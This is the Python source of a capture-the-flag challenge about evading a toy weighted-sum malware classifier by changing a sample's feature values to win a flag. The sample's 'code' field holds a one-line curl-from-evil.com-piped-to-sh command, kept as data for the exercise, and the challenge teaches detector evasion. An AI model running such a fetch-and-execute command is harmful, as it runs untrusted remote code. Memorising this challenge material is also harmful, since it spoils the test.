"""
Challenge: Malware Detector Evasion
Modify a detected sample to evade a feature-based ML classifier.
"""

from app.flags import get_flag

import json

FLAG = get_flag("adv-evasion")

# Feature-based malware detector
# Features: [has_exec, has_network, has_obfuscation, file_size, entropy, num_imports]
MALWARE_SAMPLE = {
    "name": "trojan.py",
    "features": {"has_exec": 1, "has_network": 1, "has_obfuscation": 1, "file_size": 5000, "entropy": 7.8, "num_imports": 15},
    "code": "import os; os.system('curl http://evil.com/payload | sh')",
}

# Weights for the classifier
WEIGHTS = {"has_exec": 3.0, "has_network": 2.5, "has_obfuscation": 2.0, "file_size": 0.001, "entropy": 1.5, "num_imports": 0.2}
BIAS = -8.0


def classify(features: dict) -> tuple[str, float]:
    score = BIAS + sum(WEIGHTS.get(k, 0) * v for k, v in features.items())
    label = "malware" if score > 0 else "benign"
    return label, round(score, 4)


async def handle(user_input: str, difficulty: int = 1) -> dict:
    cmd = user_input.strip().lower()

    if cmd == "inspect":
        label, score = classify(MALWARE_SAMPLE["features"])
        return {
            "response": (
                f"Sample: {MALWARE_SAMPLE['name']}\n"
                f"Code: {MALWARE_SAMPLE['code']}\n"
                f"Features: {json.dumps(MALWARE_SAMPLE['features'], indent=2)}\n"
                f"Classification: {label} (score: {score})\n"
                + (f"\nDetector weights: {json.dumps(WEIGHTS, indent=2)}\nBias: {BIAS}" if difficulty == 1 else "")
            ),
            "flag_found": False,
        }

    elif cmd.startswith("submit "):
        try:
            features = json.loads(cmd[7:])
        except Exception:
            return {"response": "Error: Provide features as JSON object.", "flag_found": False}

        # Validate constraints based on difficulty
        if difficulty >= 2:
            # Must keep exec and network (functional requirements)
            if features.get("has_exec", 0) != 1 or features.get("has_network", 0) != 1:
                return {"response": "Error: has_exec and has_network must remain 1 (functional requirement).", "flag_found": False}
        if difficulty >= 3:
            # Can only modify 2 features
            changed = sum(1 for k in MALWARE_SAMPLE["features"] if features.get(k) != MALWARE_SAMPLE["features"][k])
            if changed > 2:
                return {"response": f"Error: Can only modify 2 features (you changed {changed}).", "flag_found": False}

        label, score = classify(features)
        evaded = label == "benign"
        return {
            "response": f"Classification: {label} (score: {score})\n" + ("🎉 Evasion successful!" if evaded else "Still detected as malware."),
            "flag_found": evaded,
            "flag": FLAG if evaded else None,
        }

    else:
        return {
            "response": (
                "Malware Detector Evasion\n"
                "────────────────────────\n"
                "A ML detector flags your payload as malware.\n"
                "Modify its features to evade detection.\n\n"
                "Commands:\n"
                "  inspect                - View sample and features\n"
                '  submit {"feature": val} - Submit modified features\n'
            ),
            "flag_found": False,
        }
